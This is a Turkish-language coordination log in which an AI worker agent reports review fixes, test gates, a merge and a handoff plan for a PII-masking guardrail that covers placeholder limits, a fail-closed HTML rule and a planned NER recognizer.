Alındı: r5 DUZELT (MAJOR-r5-1 gerileme, MINOR-r5-1..4, NOTE-1/2/7). KARARLAR "C17 HTML kuralı, düzeltmeler" (g)-(i) bağlayıcı kabul. Sıra: MAJOR-r5-1 (istisna önceki karaktere bakmaz, kuyruk testi iki yolda) → MINOR-r5-1 (eşik 10.000.000, ASCII rakam) → NOTE-7 → MINOR-r5-4 + NOTE-1 → MINOR-r5-2/3 (docs, testler, PR notu). Her biri önce kırmızı test, ayrı commit.

### A-08T1-0041 · 2026-11-03 22:30 · → koordinator · YIGIN-AÇ
Paket: 08-tam-1a r5 DUZELT
Yalın yığın açılıyor: ffcore-08t1, postgres + redis + litellm + fake-llm + qdrant, imaj 0.0.0-08t1. Hedefli test-int iki profil; bitince YIGIN-KAPA.

### A-08T1-0042 · 2026-11-03 22:56 · → koordinator · YIGIN-KAPA
Paket: 08-tam-1a r5 DUZELT
ffcore-08t1 yalın yığını `down -v` ile kapandı; konteyner 0, volume 0.

### A-08T1-0043 · 2026-11-03 22:56 · → koordinator · PR-HAZIR
Paket: 08-tam-1a r6   Cevap: K-08T1-0028
SHA: 33a0268f66bacde2cd57204e942b62b0ea2385cb (feat/08-tam-1-ner; 60f2250 üstüne 6 commit, 17 dosya +225/-81; main...HEAD 52 dosya, 39 commit). PR notu: state/pr/08-tam-1a.md ("Review r5 bulgu → düzeltme → kanıt" tablosu, r6 kapı tablosu, bilinen sınırlar güncel).
Kapılar HEAD'de: lint 0; make test llmaas 1525 / airgap 1525; hedefli test-int llmaas 150 passed, airgap 148 passed + 2 skipped. Kırmızı kanıtı commit öncesi kodla: r5_tail 10/17, range + history 7.
MAJOR-r5-1 (g), MINOR-r5-1 (h, eşik 10.000.000 + ASCII rakam), MINOR-r5-2 (i, docs), MINOR-r5-3/4, NOTE-1/2/7 kapalı. Evaluate uç noktasında 400 `placeholder_out_of_range` docs ve openapi'ye eklendi (açıklama değişikliği, additive; 08.yaml yeniden üretildi, sözleşme testi yeşil) ve bir testle kanıtlandı.
İnceleyiciye not: (h) uygulaması `PLACEHOLDER` desenini 1-7 haneye indirdi. Böylece 8 haneli ve daha uzun numaralar hiçbir yerde yer tutucu sayılmıyor: ayrılmıyor, açılmıyor, sayılmıyor. HTML istisnası ise `PII_[0-9]{1,8}>>` olarak kaldı (fail-closed tarafta fark yok). Dal donuk; sonucu bekliyorum.

### A-08T1-0044 · 2026-11-03 22:58 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0031
Alındı: 33a0268 VERIFIED, r6 kısa delta incelemede; dal donuk, commit yok. Sonucu bekliyorum.

### A-08T1-0045 · 2026-11-03 23:13 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0032
Alındı: r6 ONAY; merge öncesi (h′): taşınan numara yok sayma eşiği 1.000.000, verme sınırı 9.999.999 ve 1-7 hane aynı. Önce kırmızı test, ayrı commit; lint + ilgili testler + make test tek profil; NOTE-1/2/3 PR notuna; sonra PR-HAZIR r7.

### A-08T1-0046 · 2026-11-03 23:15 · → koordinator · YIGIN-AÇ
Paket: 08-tam-1a r6 küçük DUZELT
Yalın yığın kısa süre açılıyor (ffcore-08t1, postgres + redis + litellm + fake-llm + qdrant): yalnız ilgili entegrasyon dosyası (test_08t_m2_history) için; bitince YIGIN-KAPA.

### A-08T1-0047 · 2026-11-03 23:22 · → koordinator · YIGIN-KAPA
Paket: 08-tam-1a r6 küçük DUZELT
ffcore-08t1 yalın yığını `down -v` ile kapandı; konteyner 0, volume 0.

### A-08T1-0048 · 2026-11-03 23:22 · → koordinator · PR-HAZIR
Paket: 08-tam-1a r7   Cevap: K-08T1-0032
SHA: c9258241a411ef27393f79e10ea1cde383506b20 (feat/08-tam-1-ner; 33a0268 üstüne 1 commit c925824, 6 dosya +45/-18; main...HEAD 52 dosya, 40 commit). PR notu: state/pr/08-tam-1a.md (en üstte "r6 ONAY sonrası küçük DUZELT" bölümü).
(h′): `CARRIED_MAX_NUMBER = 1_000_000`. `reserve_carried` yalnız ≤ 1.000.000 numaraları ayırıyor; verme sınırı 9.999.999 ve 1-7 hane aynı. Testler: taşınan `<<PII_9999999>>` ve `<<PII_1000001>>` → `<<PII_1>>`; `<<PII_1000000>>` → `<<PII_1000001>>`; gerçek Redis'te konuşma çalışıyor. Yeni test commit öncesi kodla 2 durumda kırmızıydı. Tükenme testleri artık sayacı `store.reserve` ile dolduruyor. NOTE-1/2 docs ve yorum aynı commit'te; NOTE-3 PR notunda kısıt olarak.
Kapılar HEAD'de: make lint 0; ilgili dosyalar 62 passed; make test llmaas 1529 passed.
Not: "açılmaz" kısmı ayrıca kodlanmadı; 1.000.000 üstü numarayı hiçbir gerçek kapsam vermediği için çözümleme zaten bulamıyor. Verme sınırı 9.999.999 kaldığı için okuma tarafına ikinci bir eşik koymadım. Dal donuk; ONAY-TEYIT ve merge'i bekliyorum.

### A-08T1-0049 · 2026-11-03 23:23 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0035
Alındı: c925824 VERIFIED, ONAY-TEYIT bekleniyor; dal donuk. HANDOFF (1b notları) taslağı hazırlanıyor, merge sonrasına kadar kanala yazılmayacak.

### A-08T1-0050 · 2026-11-03 23:48 · → koordinator · HANDOFF
Paket: 08-tam-1a (MERGED, main 1d836a0 ← c925824) → 08-tam-1b (NER + PRSIM)   Cevap: K-08T1-0037
Lease: ffcore-isci-a-08-tam-1 → **RETIRED** (başlık güncellendi). `.worktrees/feat/08-tam-1-ner` içinde açık ya da izlenmeyen dosyam yok (git status temiz). Yığın kapalı (ffcore-08t1: konteyner 0, volume 0). `ffcore/{backend,tools}:0.0.0-08t1` imajları duruyor; silme kararı koordinatörün. Scratchpad'deki geçici dosyalar (tee logları, düzenleme betikleri) depoda değil.

**1. 1a'nın bıraktığı yapı (1b bunun üstüne kurulur)**
- `guardrails/masking.py`:
  - yazma tarafı `PlaceholderAligner`; okuma tarafı `StreamDetokenizer` (facade düz) ve `ContextReveal` (konsol/facade agent);
  - `UrlLines`: akış düzeyinde HTML + markdown satır kuralı, artımlı tarama;
  - `reveal_text`; geçmiş için `rescope` + `entry()` (TTL yenilemez);
  - `reserve_carried`; `PlaceholderOutOfRange`.
- `api/runs.py`: `exit_mode`, `exit_hook(after=)`, `detokenizer` (yeniden bağlanmada `token_texts` ile durum kurma).
- facade: `FacadeGuard.reveal` + `token_store_errors` → 502 `detokenize_unavailable`.
- `runtime/adapters._history`: hamsız eşleme.
- Ters eşlemede `i:<token>` (`category:value`): NER kategorileri (`PERSON`, `ORGANIZATION`, `LOCATION`) aynı `_identity` ve `tokenize` yolundan girer, C17 için ek iş yok.
- Yer tutucu: 1-7 ASCII hane; verme sınırı 9.999.999 (aşarsa `placeholder_out_of_range`, `on_error`'dan bağımsız); taşınan > 1.000.000 yok sayılır.

**2. C17 son biçimi (KARARLAR, bağlayıcı)**
- "C17 geri çevirme bağlam istisnası" (A).
- "C17 URL bağlam kuralı satır düzeyinde ve fail-closed" + ek (b) işaretler, (c) artımlı tarama, (d)/(d′) yeniden bağlanmada durum kurma ve başarısızsa akışın kalanı, (e) boş satır yalnız markdown hedefini kapatır.
- "C17 geri çevirme: cevap düzeyinde HTML fail-closed" (A; ek (a)'nın yerini aldı).
- "C17 HTML kuralı, düzeltmeler":
  - (g) istisna önceki karaktere bakmaz;
  - (h)/(h′) eşikler;
  - (i) kapsam okuyucunun akışıdır, bedel konsol sahibine de düşer.
- Docs: `docs/guardrail.md` "Reversal at the exit" ve "The trade-off" paragrafları.

**3. 08-tam-1b: S1-S5 ve işaretçiler**
- K-08T1-0002 (S1-S9 hepsi A; S7: 1b ağırlıklar gelince), K-08T1-0004 (yazma tarafında hizalama; çıkışta enforce `pii` kuralı varsa geri çevirme yok), K-08T1-0008 (1b yeni oturumda, 1a merge sonrası). Plan: `state/pr/08-tam-1.md` ("08-tam-1b" bölümü, kabul kriterleri 1-6 ve 15, S1-S5).
- **S1:** Presidio yok. `guardrails/recognizers/ner.py` transformers `pipeline("token-classification")` (transformers 4.57.6, torch 2.14.0 CPU zaten bağımlılık, yeni paket yok). Bulgular `Finding`, regex ile aynı `resolve_overlaps`.
- **S2:** model yalnız API sürecinde. Worker (`EngineGuard`) ve ingest filtresi `POST /api/v1/internal/ner` çağırır. Desen 04a `/internal/embed`: servis jetonu, `SafeOutboundClient`, `LocalEmbedClient`/`HttpEmbedClient` benzeri Local/Http istemci, `GUARDRAIL_NER_URL`. Ingest filtresi bu çağrı için async'e alınır. API kapalıysa açık hata; regex'e sessiz düşüş yok (NER politikası `on_error` fail-closed).
- **S3:** `NER_MODEL` + `NER_REVISION` `.env.example`'da açık değer, compose `${…:?}` fail-loud. `deploy/offline/models.txt` aynı revizyon (repo, revision, yol, sha256, bayt; bge-m3 satırı deseni).
- **S4:** ağırlık `model_cache` volume + `make models` (`knowledge/models.py` `required()`/`download()`/`hf_path(local_files_only=True)`). İmaja girmez; Makefile hedefi aynı.
- **S5, aday listesi ve model kartları (hiçbiri doğrulanmadı, ağa bağlanılmadı):**
  - BERTurk-NER: `savasy/bert-base-turkish-ner-cased` ve `akdeniz27/bert-base-turkish-cased-ner`;
  - TabiBERT: yalnız NER başlıklı hazır model varsa. Taban encoder ise eğitim kapsam dışı (ARCH-07), aday elenir, gerekçe PR'da.
  - Kullanıcının `make models` adımı model kartı (`README.md`) ve `config.json`'u da indirmeli. Lisans ve `id2label` etiketleri offline okunur.
  - Gerçek model koşusu öncesi indirme yolu ve `--network none` kanıtı gerekir (ENV-83). Ağırlık yoksa NER testleri NOT_RUN gerekçeli; VERIFIED için `make models` şart (K-04a-0020).
- **Ölçüm:** `data/samples/pii/pii-100.jsonl` (PERSON 22, ORG 4, LOC 4; değiştirilmez).
  - Kabul: ad-soyad recall ≥ 0,85 (llmaas hedefi 0,90 raporda); TC/telefon/IBAN/e-posta ≥ 0,98 regresyonsuz; 1.000 karakter P95 < 300 ms (tek CPU ayrıca).
  - Hiçbir aday tutmazsa ölçüm tablosuyla KARAR-GEREK (M4 eşiği kullanıcı kararı).
  - Testler: `test_08t_1_ner_recall_person`, `test_08t_1b_quality_report_matches_docs`, `test_08t_2_regex_recall_unchanged_with_ner`, `test_08t_3_ner_latency_p95` (`-m models`), `test_08t_6_worker_uses_http_ner`, `test_08t_15*`.
- **Şema:** `schemas.py` `engine: ner` reddi (`engine_unsupported`) kalkar; additive, C4 biçimi değişmez. `engine: regex` politikası NER'i hiç çağırmaz.
- **PRSIM ingest guard'ı:**
  - `knowledge/ingest_mask.py` `pii_ner@1` (regex + NER, HTTP);
  - `raw_ingest.py` `TEXT_FILTER` varsayılanı;
  - `raw_staging.py` `prsim_requires_ner` reddi `pii_ner` ile kalkar;
  - `cli.py` `--accept-personnel-data` geriye uyumlu (deprecation notu);
  - eski `pii_regex@1` belgeleri değişmez;
  - M3 koşusu sürüyorsa ve ölçüm manifestine dokunulacaksa dur.

**4. FOLLOWUP-162 (açık; 1b'ye ya da ayrı)**
- **İlk commit önerisi:** docs/api.md:540 ve docs/guardrail.md:128 örneği. Koordinatörün işaret ettiği iki yer; eşik örneği (h′) sonrası `<<PII_9999999>>` ile sayaç doldurma, 1.000.000 ile tutarlı yazılmalı.
- **1b'yi doğrudan ilgilendiren:** MINOR-r3-7. Araç sonucu ve KB parçasındaki düz `<<PII_n>>` metni `reserve_carried`'dan geçmiyor; NER bulguları KB'den de geleceği için egress tokenize öncesi ayrılmalı.
- **Diğerleri (PR notunda kısıt olarak):**
  - r1 MINOR 4, 5, 6, 9, 10, 13 (106 yanlış negatifleri: `auth_token:`, `DB_TOKEN=`, boşluklu `api key`), 14 ve NOTE 1-8;
  - r2 NOTE 2-8;
  - r3 NOTE-3/4/5;
  - r4 NOTE 1/2/4/5 (`gate.commit` finally, ikinci hata dalında `rest()`, XRANGE `COUNT` sayfalama, büyük tek parçada span × yer tutucu);
  - r5 NOTE-3/4;
  - r6 NOTE-3.

**5. Yedi turdan öğrenilenler**
- **Fail-closed kural kendi ayrımlarına güvenmemeli.** HTML'i satır satır izleyen her ayrım (tırnak, açıcı önceliği, blok türü, kaçışlar) bir sonraki turda yeni bir yazımla atlatıldı. Sınıf kuralı (ilk etiketten sonra akışın kalanı) dört turluk yamayı bitirdi ve kodu küçülttü. Benzer bir kural yazılırken önce sınıf düzeyi seçenek koordinatöre sorulmalı.
- **Optimizasyon güvenlik istisnasını sessizce değiştirebilir.** Artımlı taramanın 32 karakterlik penceresi istisnanın geriye bakışını bozdu (r5 MAJOR). Pencereli taramada her istisna pencere sınırında test edilmeli; inceleyicinin kuyruk probe'u bunu yakaladı.
- **Sınır/eşik çiftleri aynı noktada olmamalı.** Taşınan numara eşiği verme sınırıyla aynı yerdeyken konuşma iki kez kalıcı bozuldu (99.999.999, sonra 9.999.999). Eşik sınırın çok altında olmalı (h′).
- **Kararın lafzıyla amacı ayrıştığında KARAR-GEREK açılmalı.** (d) ve (e) yazıldığı gibi uygulansaydı biri sızıntı, biri kullanılabilirlik sorunu yaratacaktı; ikisi KARAR-GEREK ile düzeltildi (K-08T1-0020/0021).
- **Kırmızı kanıtı her turda commit öncesi kodla alındı;** imza değişikliğiyle (TypeError) gelen kırmızılar PR notunda ayrıca belirtildi. Kapsama testleri (eski kodda da yeşil) ayrı yazıldı.
- **Süreç:**
  - Bash aracı heredoc'ta `\\` çiftini teke indiriyor; ters bölülü düzenlemeler Write ile dosyaya yazılıp oradan çalıştırılmalı (memory notu var).
  - Kanal saatleri `date` ile (K-08T1-0017).
  - Fake sağlayıcı cevabı 50 karakterde kesiyor; entegrasyon şekilleri buna sığmalı.
- **Kapı komutları:**
  - `MSYS_NO_PATHCONV=1 FFCORE_VERSION=0.0.0-08t1 docker compose -p ffcore-08t1 --env-file .env.test run --rm [--no-deps] [-e GUARDRAIL_EGRESS_ENABLED=false -e DEPLOY_PROFILE=airgap] tools make lint|test`;
  - hedefli test-int `-w /work/backend tools pytest …` + `QDRANT_URL=http://qdrant:6333 RUN_QDRANT_TESTS=1`;
  - yalın yığın `--profile test --profile qdrant up -d --wait postgres redis litellm fake-llm qdrant`.

Sonrası yok; bu oturum durur. 08-tam-1b için kullanıcının yeni oturum açması gerekiyor (ROL=isci-a PAKET=08-tam-1b).
